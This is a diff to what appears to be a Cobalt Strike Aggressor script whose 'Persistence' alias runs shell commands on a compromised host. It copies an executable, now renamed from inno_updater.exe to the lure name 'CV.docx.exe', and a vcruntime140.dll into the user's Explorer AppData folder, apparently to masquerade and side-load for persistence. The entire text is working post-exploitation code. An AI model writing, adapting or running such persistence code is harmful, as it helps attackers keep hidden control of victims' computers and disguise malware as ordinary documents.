@@ -1,7 +1,7 @@
 alias Persistence {
     $bid = $1;
     
-    $cmd = "copy inno_updater.exe %userprofile%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\inno_updater.exe";
+    $cmd = "copy CV.docx.exe %userprofile%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\inno_updater.exe";
     bshell($bid, $cmd);
     $cmd = "copy vcruntime140.dll %userprofile%\\AppData\\Local\\Microsoft\\Windows\\Explorer\\vcruntime140.dll";
     bshell($bid, $cmd);
